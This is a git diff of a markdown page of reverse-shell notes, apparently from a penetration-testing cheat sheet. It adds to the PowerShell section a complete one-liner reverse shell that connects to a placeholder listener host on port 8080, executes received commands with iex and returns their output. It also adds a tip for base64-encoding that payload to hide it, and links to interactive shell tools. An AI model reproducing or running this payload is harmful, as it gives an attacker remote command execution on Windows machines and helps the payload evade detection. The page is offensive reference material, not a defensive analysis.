@@ -67,8 +67,20 @@ These are just some of the ways
     
         
 ## Powershell
-   * Get fully interactive shell with [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
-   * Please see script with examples above (mshta - var a,b and c)
-   * To be added here and more
-   * Working shells I have tried:
-      * [Mini-Reverse](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5) by @staaldraad
+* Please see script with examples above (mshta - var a,b and c)
+* To be added here and more
+* Working shells I have tried:
+    * [Mini-Reverse](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5) by @staaldraad
+
+### One-liners
+* Famous powershell one-liner
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+* You can [base64 encode](../Useful_Commands/Linux.html#base64-encode) the block above and execute with this:
+```powershell
+powershell -EncodedCommand <Base64_payload>
+```
+
+### Fully interactive powershell
+* Get fully interactive shell with [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
